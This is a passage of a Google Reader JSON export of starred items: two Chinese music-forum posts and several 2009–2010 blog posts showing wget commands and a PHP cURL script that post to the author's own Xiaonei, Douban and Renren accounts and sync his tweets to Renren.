      "content" : "我发过她的一张专辑 \n\n自购资源 \n\n下载："
    },
    "author" : "coldplay",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1299915107465",
    "timestampUsec" : "1299915107465017",
    "id" : "tag:google.com,2005:reader/item/5701986058c18974",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "单曲EP好听分享" ],
    "title" : "Jessie J &lt;Who You Are - Single&gt;2011年最受期待的女声新歌[115]",
    "published" : 1299915107,
    "updated" : 1299915107,
    "alternate" : [ {
      "href" : "http://www.oppsu.cn/read.php?tid-58933.html",
      "type" : "text/html"
    } ],
    "summary" : {
      "direction" : "ltr",
      "content" : "专辑封面： \n \n\n曲目列表： \n \n \n\n简介： \n不说啥了，地球人都知道~~~ \n\n购买方式：（来自网络共享）"
    },
    "author" : "eyescream",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://www.oppsu.cn/rss.php?fid-19.html",
      "title" : "OppsU!音乐世界",
      "htmlUrl" : "http://www.oppsu.cn"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298465287920",
    "timestampUsec" : "1298465287920391",
    "id" : "tag:google.com,2005:reader/item/aa82f23da36e21c2",
    "categories" : [ "user/07404792466326621424/state/com.google/read", "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/tracking-item-link-used", "Linux技巧", "wget", "xiaonei" ],
    "title" : "用bash脚本更新校内状态",
    "published" : 1240285389,
    "updated" : 1240285389,
    "alternate" : [ {
      "href" : "http://yegle.net/2009/04/21/use-bash-to-update-xiaonei-status-and-blog/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>\n<p style=\"text-align:left\">其实就是些模拟post操作……</p>\n<p style=\"text-align:left\">昨天跟<a href=\"http://twitter.com/liufeng\">@liufeng</a>在twitter上说研究一下那个python代码……其实我不懂python……仔细看了一下发现看不懂……还是自己用firefox+live http header模拟表单提交吧……</p>\n<p style=\"text-align:left\">liufeng兄……辜负你的<a href=\"http://blog.cnliufeng.com/2009/04/got-crazy-by-python-string.html\">期望</a>了……</p>\n<p style=\"text-align:left\">\n<p style=\"text-align:left\">我用wget搞定的，应该用curl也行，没去研究了……</p>\n<p style=\"text-align:left\">\n登录<br>\nwget –no-proxy -O xiaoneilogin.log –post-data=”email=youremailaddr&amp;password=yourpasswd&amp;autoLogin=true”  –keep-session-cookies –save-cookies=xiaoneicookie http://login.xiaonei.com/Login.do\n</p>\n<p style=\"text-align:left\">\n<p style=\"text-align:left\">发新日志<br>\nwget –no-proxy -O xiaoneipost.log –post-data=”title=Your_blog_title&amp;body=Your_blog_content&amp;categoryId=0&amp;blogControl=99&amp;passwordProtected=0″ –load-cookies=xiaoneicookie http://blog.xiaonei.com/NewEntry.do\n</p>\n<p style=\"text-align:left\">默认发到“默认分类”</p>\n<p style=\"text-align:left\">\n<p style=\"text-align:left\">发新状态<br>\nwget –no-proxy -O xiaoneipost.log –post-data=”c=Your_Status”  –keep-session-cookies –load-cookies=xiaoneicookie http://status.xiaonei.com/doing/update.do –referer=http://status.xiaonei.com/getdoing.do</p>\n<img src=\"http://yegle.net/34083cd2/480ec708/Feedfetcher-Google;%20(+http://www.google.com/feedfetcher.html;%2078%20subscribers;%20feed-id=8644335181920110737).gif\"></p></p></p></p>"
    },
    "author" : "yegle",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://yegle.net/feed/",
      "title" : "一阁Blog",
      "htmlUrl" : "http://yegle.net"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298465286524",
    "timestampUsec" : "1298465286524323",
    "id" : "tag:google.com,2005:reader/item/41c1620b7bea6f33",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "未分类" ],
    "title" : "用bash往豆瓣上更新广播",
    "published" : 1240364570,
    "updated" : 1240364570,
    "alternate" : [ {
      "href" : "http://yegle.net/2009/04/22/update-douban-status-using-bash/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>\n<p style=\"text-align:left\">豆瓣……咋说呢……丫虽然有开放的API，反正我是没折腾明白怎么用最简单的方法把信息发布到它的“广播”上，还是和昨天一样，用wget模拟post</p>\n<p style=\"text-align:left\">但是仔细看却发现一个问题……丫每次登录给一个不同的随机值，在表单里有个ck项，提交的时候会检查这个东东……</p>\n<p style=\"text-align:left\">我只能说……何必呢？在正则面前算个毛……</p>\n<p style=\"text-align:left\">\n<p style=\"text-align:left\">以下为代码，是php的，我也懒得翻译了……自己替换一下就OK了……</p>\n<p style=\"text-align:left\">btw似乎也就xiaonei和douban的服务这么恶心吧……非得模拟post才能搞定</p>\n<p>$doubanlogincmd=”/usr/bin/wget –no-proxy -O – –post-data=\\”form_email=$doubanusername&amp;form_password=$doubanpassword\\”  –keep-session-cookies –save-cookies=doubancookie http://www.douban.com/login|tee doubanlogin.log|grep logout|sed ’s/.*ck=\\([^\\&quot;]*\\)\\”.*/\\\\1/’ &gt;ck”;<br>\n$doubanpostcmd=”/usr/bin/wget –no-proxy -O doubanpost.log –post-data=\\”mb_text=$msg&amp;mb_submit=+我说+&amp;ck=`cat ck`\\”  –keep-session-cookies –load-cookies=doubancookie http://www.douban.com/people/3983206/miniblogs –referer=http://www.douban.com/”</p>\n<img src=\"http://yegle.net/34083cd2/480ec708/Feedfetcher-Google;%20(+http://www.google.com/feedfetcher.html;%201%20subscribers;%20feed-id=16333373540026151896).gif\"></p></p>"
    },
    "author" : "yegle",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://yegle.net/feed/",
      "title" : "一阁Blog",
      "htmlUrl" : "http://yegle.net"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298465262641",
    "timestampUsec" : "1298465262641531",
    "id" : "tag:google.com,2005:reader/item/f76e2360dae70d2e",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "网络相关", "php", "renren", "twitter" ],
    "title" : "twitter同步到renren的php脚本",
    "published" : 1256979364,
    "updated" : 1256979364,
    "alternate" : [ {
      "href" : "http://yegle.net/2009/10/31/php-script-synchronizing-twitter-to-renren/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>声明：脚本以CC by-nc-sa协议公布，如需转载请给出原文链接并保留脚本头部的版权声明。</p>\n<p>声明：本人不对可能发生的您的renren.com好友被刷屏、脚本错误反复刷屏、您的好友解除与你的好友关系、您的renren.com帐号被举报等等任何不良后果负责~</p>\n<p>100129：修正脚本的bug</p>\n<p>网上已经有一个twitter2renren的同步网站了，地址在这里：<a href=\"http://twitter2renren.appspot.com/\">http://twitter2renren.appspot.com/</a><br>\n问题有两个，一个是据说现在已经无法同步了，另一个是这个网站需要输入twitter用户名密码，不支持OAuth，这让我很不放心。于是决定自己写个脚本。</p>\n<p>自己动手丰衣足食，不过也有问题，一是一般只用于解决自己的问题，其他人可能还需要修改才能用，二是一般都是无比quick and dirty，懒得写注释和注意排版。这次这个代码好像好多人想用，所以已经尽量考虑比较多的特殊情况，排版也稍微好看一点了……</p>\n<p>使用说明：<br>\n根据代码中的提示，修改几个变量的值<br>\n然后尝试运行一遍脚本，如果没有报错的话，你会看到最近的推显示在屏幕上。这是转发twitter到renren.com后根据renren返回的json解码得到的信息。<br>\n根据你执行脚本时的速度选择crontab的时间间隔。我这里选的是5分钟。执行crontab -e<br>\n添加以下代码：</p>\n\n<div><table><tr><td><pre style=\"font-family:monospace\"><span style=\"color:#000000;font-weight:bold\">*/</span><span style=\"color:#000000\">5</span> <span style=\"color:#000000;font-weight:bold\">*</span> <span style=\"color:#000000;font-weight:bold\">*</span> <span style=\"color:#000000;font-weight:bold\">*</span> <span style=\"color:#000000;font-weight:bold\">*</span> <span style=\"color:#000000;font-weight:bold\">/</span>path<span style=\"color:#000000;font-weight:bold\">/</span>to<span style=\"color:#000000;font-weight:bold\">/</span>twitter2renren.php <span style=\"color:#000000\">2</span><span style=\"color:#000000;font-weight:bold\">&gt;&amp;</span><span style=\"color:#000000\">1</span> <span style=\"color:#000000;font-weight:bold\">&gt;&gt;/</span>path<span style=\"color:#000000;font-weight:bold\">/</span>to<span style=\"color:#000000;font-weight:bold\">/</span>logfile</pre></td></tr></table></div>\n\n<p>Done!</p>\n<p>以下为代码：</p>\n\n<div><table><tr><td><pre style=\"font-family:monospace\"><span style=\"color:#339933\">&lt;</span> ?php\n \n<span style=\"color:#666666;font-style:italic\">//</span>\n<span style=\"color:#666666;font-style:italic\">//twitter2renren.php</span>\n<span style=\"color:#666666;font-style:italic\">//By @yegle, yegle.net</span>\n<span style=\"color:#666666;font-style:italic\">//Licensed under CC by-nc-sa</span>\n<span style=\"color:#666666;font-style:italic\">//</span>\n \n<span style=\"color:#000088\">$file</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'用于记录你最后一次同步tweet id的文件路径。注意不要删除并让脚本能读取！'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$cookie_file</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'保留curl模拟登陆renren.com的cookie文件路径。'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$name_pwd</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'你的twitter用户名密码。格式为：yourusername:yourpassword'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$hashtag</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'如果你希望在你的推里包含特殊字符串时才转过去，请设置该变量，否则只转发不是以@开头的推'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$renren_username</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'renren.com登录用户名'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$renren_password</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'renren.com登录密码'</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#666666;font-style:italic\">//配置完毕，请停止编辑文件！</span>\n<span style=\"color:#666666;font-style:italic\">//That's it!Stop editing anything below unless you know what you are doing!</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">file_exists</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$lastid</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">intval</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">file_get_contents</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n<span style=\"color:#b1b100\">else</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#990000\">touch</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#000088\">$lastid</span> <span style=\"color:#339933\">=</span> <span style=\"color:#cc66cc\">0</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n \n \n<span style=\"color:#000088\">$timeline_url</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'http://'</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$name_pwd</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">'@twitter.com/statuses/user_timeline.json?count=200'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$lastid</span><span style=\"color:#339933\">!==</span><span style=\"color:#cc66cc\">0</span><span style=\"color:#009900\">)</span> <span style=\"color:#000088\">$timeline_url</span><span style=\"color:#339933\">.=</span><span style=\"color:#0000ff\">&#39;&amp;since_id=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$lastid</span><span style=\"color:#339933\">;</span>\n \n \n<span style=\"color:#000088\">$timeline</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">file_get_contents</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$timeline_url</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$arr</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">json_decode</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$timeline</span><span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">empty</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$arr</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">)</span> <span style=\"color:#990000\">exit</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$new_id</span> <span style=\"color:#339933\">=</span> <span style=\"color:#000088\">$arr</span><span style=\"color:#009900\">[</span><span style=\"color:#cc66cc\">0</span><span style=\"color:#009900\">]</span><span style=\"color:#009900\">[</span><span style=\"color:#0000ff\">'id'</span><span style=\"color:#009900\">]</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$new_id</span> <span style=\"color:#339933\">==</span> <span style=\"color:#0000ff\">''</span><span style=\"color:#009900\">)</span> <span style=\"color:#990000\">exit</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">file_put_contents</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$file</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$new_id</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$post_arr</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">array</span><span style=\"color:#009900\">(</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">foreach</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$arr</span> <span style=\"color:#b1b100\">as</span> <span style=\"color:#000088\">$tweet</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">strpos</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$tweet</span><span style=\"color:#009900\">[</span><span style=\"color:#0000ff\">'text'</span><span style=\"color:#009900\">]</span><span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'@'</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">!==</span><span style=\"color:#cc66cc\">0</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n        <span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$hashtag</span><span style=\"color:#339933\">!==</span><span style=\"color:#0000ff\">''</span> <span style=\"color:#339933\">&amp;&amp;</span> <span style=\"color:#990000\">strpos</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$tweet</span><span style=\"color:#009900\">[</span><span style=\"color:#0000ff\">'text'</span><span style=\"color:#009900\">]</span><span style=\"color:#339933\">,</span><span style=\"color:#000088\">$hashtag</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">!==</span><span style=\"color:#009900;font-weight:bold\">FALSE</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n            <span style=\"color:#000088\">$post_arr</span><span style=\"color:#009900\">[</span><span style=\"color:#009900\">]</span> <span style=\"color:#339933\">=</span> <span style=\"color:#000088\">$tweet</span><span style=\"color:#009900\">[</span><span style=\"color:#0000ff\">'text'</span><span style=\"color:#009900\">]</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">' [twitter]'</span><span style=\"color:#339933\">;</span>\n        <span style=\"color:#009900\">}</span>\n    <span style=\"color:#009900\">}</span>\n<span style=\"color:#009900\">}</span>\n \n \n<span style=\"color:#000088\">$post_arr</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">array_reverse</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$post_arr</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#000088\">$renren_login</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'http://passport.renren.com/PLogin.do'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$ch</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_init</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$renren_login</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_COOKIEJAR<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$cookie_file</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POST<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_FOLLOWLOCATION<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POSTFIELDS<span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'email='</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$renren_username</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;password=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#000088\">$renren_password</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;autoLogin=true&amp;origURL=http://www.renren.com/Home.do&amp;domain=renren.com&#39;</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_RETURNTRANSFER<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_exec</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#990000\">curl_close</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#000088\">$renren_status</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'http://status.renren.com/doing/update.do'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#b1b100\">foreach</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$post_arr</span> <span style=\"color:#b1b100\">as</span> <span style=\"color:#000088\">$item</span><span style=\"color:#009900\">)</span><span style=\"color:#009900\">{</span>\n    <span style=\"color:#000088\">$post</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'c='</span><span style=\"color:#339933\">.</span><span style=\"color:#990000\">urlencode</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$item</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;raw=&#39;</span><span style=\"color:#339933\">.</span><span style=\"color:#990000\">urlencode</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$item</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&#39;&amp;isAtHome=0&#39;</span><span style=\"color:#339933\">;</span>\n \n    <span style=\"color:#000088\">$ch</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_init</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$renren_status</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POST<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_POSTFIELDS<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$post</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_RETURNTRANSFER<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_COOKIEFILE<span style=\"color:#339933\">,</span><span style=\"color:#000088\">$cookie_file</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_FOLLOWLOCATION<span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_setopt</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#339933\">,</span>CURLOPT_REFERER<span style=\"color:#339933\">,</span><span style=\"color:#0000ff\">'http://status.renren.com/ajaxproxy.htm'</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#000088\">$ret</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">curl_exec</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#990000\">curl_close</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ch</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#000088\">$ret</span> <span style=\"color:#339933\">=</span> <span style=\"color:#990000\">json_decode</span><span style=\"color:#009900\">(</span><span style=\"color:#000088\">$ret</span><span style=\"color:#339933\">,</span><span style=\"color:#009900;font-weight:bold\">TRUE</span><span style=\"color:#009900\">)</span><span style=\"color:#339933\">;</span>\n    <span style=\"color:#b1b100\">echo</span> <span style=\"color:#000088\">$ret</span><span style=\"color:#009900\">[</span><span style=\"color:#0000ff\">'msg'</span><span style=\"color:#009900\">]</span><span style=\"color:#339933\">.</span><span style=\"color:#0000ff\">&quot;<span style=\"color:#000099;font-weight:bold\">\\n</span>&quot;</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#009900\">}</span>\n \n<span style=\"color:#000000;font-weight:bold\">?&gt;</span></pre></td></tr></table></div>\n\n<hr>\n<p><small>© yegle for <a href=\"http://yegle.net\">一阁Blog</a>, 2009. |\n本文短链：<a href=\"http://ye.gl/e/71\">http://ye.gl/e/71</a> |\n<a href=\"http://ye.gl/e/71#comments\">21个评论</a> |\nPost tags: <a href=\"http://yegle.net/tag/php/\" rel=\"tag\">php</a>, <a href=\"http://yegle.net/tag/renren/\" rel=\"tag\">renren</a>, <a href=\"http://yegle.net/tag/twitter/\" rel=\"tag\">twitter</a><br>\n</small></p>"
    },
    "author" : "yegle",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://yegle.net/feed/",
      "title" : "一阁Blog",
      "htmlUrl" : "http://yegle.net"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298465261085",
    "timestampUsec" : "1298465261085675",
    "id" : "tag:google.com,2005:reader/item/193c31855170f438",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "web编程", "curl", "php" ],
    "title" : "PHP cURL代码举例",
    "published" : 1257678154,
    "updated" : 1257678154,
    "alternate" : [ {
      "href" : "http://yegle.net/2009/11/08/php-curl-intro/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>上次贴出来的twitter同步到人人的代码，很多人留言说看不懂。其实这个代码从总体上说还是比较简单的，可能大家对curl相关函数不太了解导致抱怨说看不懂。这里写篇简单的日志介绍一下curl的使用。</p>\n<p>注意：如果你需要深入学习，请在线查看php.net的文档，本文仅仅是对不了解PHP curl函数族的用户的入门简介。代码没有经过严格检查，如有错误请留言指出。同样，全文及以下代码以CC by-nc-sa释出，转载请注明出处。<br>\n <a href=\"http://yegle.net/2009/11/08/php-curl-intro/#more-437\">Continue reading “PHP cURL代码举例” »</a></p>\n<hr>\n<p><small>© yegle for <a href=\"http://yegle.net\">一阁Blog</a>, 2009. |\n本文短链：<a href=\"http://ye.gl/e/73\">http://ye.gl/e/73</a> |\n<a href=\"http://ye.gl/e/73#comments\">14个评论</a> |\nPost tags: <a href=\"http://yegle.net/tag/curl/\" rel=\"tag\">curl</a>, <a href=\"http://yegle.net/tag/php/\" rel=\"tag\">php</a><br>\n</small></p>"
    },
    "author" : "yegle",
    "comments" : [ ],
    "annotations" : [ ],
    "origin" : {
      "streamId" : "feed/http://yegle.net/feed/",
      "title" : "一阁Blog",
      "htmlUrl" : "http://yegle.net"
    }
  }, {
    "isReadStateLocked" : true,
    "crawlTimeMsec" : "1298465229634",
    "timestampUsec" : "1298465229634434",
    "id" : "tag:google.com,2005:reader/item/c478c4b6fe807131",
    "categories" : [ "user/07404792466326621424/state/com.google/starred", "user/07404792466326621424/state/com.google/read", "网络相关", "脚本", "renren", "twitter" ],
    "title" : "Twitter同步人人脚本(Updated at 2010-04-12)",
    "published" : 1271086224,
    "updated" : 1271086224,
    "alternate" : [ {
      "href" : "http://yegle.net/2010/04/12/php-script-synchronizing-twitter-to-renren-updated-version/",
      "type" : "text/html"
    } ],
    "content" : {
      "direction" : "ltr",
      "content" : "<p>使用方法详见<a href=\"http://yegle.net/2009/10/31/php-script-synchronizing-twitter-to-renren/\">这篇日志</a><br>\n人人很贱地加了个参数,以前的脚本就失效了.没啥,在强大的正则面前,任何企图让自动化脚本失效的图谋都会被粉碎!</p>\n<p>其实这个升级版里的正则还可以更漂亮一点…懒得优化了…</p>\n<p>另外这个版本会把你的官方RT也转发到renren上去</p>\n<p>Update at 2010-04-14,修改几个小bug<br>\nUpdate at 2010-05-27,修改几个小bug</p>\n\n<div><table><tr><td><pre style=\"font-family:monospace\"><span style=\"color:#339933\">&lt;</span> ?php\n \n<span style=\"color:#666666;font-style:italic\">//</span>\n<span style=\"color:#666666;font-style:italic\">//twitter2renren.php</span>\n<span style=\"color:#666666;font-style:italic\">//By @yegle, yegle.net</span>\n<span style=\"color:#666666;font-style:italic\">//Licensed under CC by-nc-sa</span>\n<span style=\"color:#666666;font-style:italic\">//</span>\n \n<span style=\"color:#000088\">$file</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'用于记录你最后一次同步tweet id的文件路径。注意不要删除并让脚本能读取！'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$cookie_file</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'保留curl模拟登陆renren.com的cookie文件路径。'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$twitter_username</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'你的twitter用户名,注意是用户名,不是邮箱名'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$twitter_pwd</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'你的twitter密码'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$hashtag</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'如果你希望在你的推里包含特殊字符串时才转过去，请设置该变量，否则只转发不是以@开头的推'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$renren_username</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'renren.com登录用户名'</span><span style=\"color:#339933\">;</span>\n<span style=\"color:#000088\">$renren_password</span> <span style=\"color:#339933\">=</span> <span style=\"color:#0000ff\">'renren.com登录密码'</span><span style=\"color:#339933\">;</span>\n \n<span style=\"color:#666666;font-style:italic\">//配置完毕，请停止编辑文件！</span>\n<span style=\"color:#b1b100\">if</span><span style=\"color:#009900\">(</span><span style=\"color:#990000\">file_exists</span><span style=\"color:#009900\">(</span><span 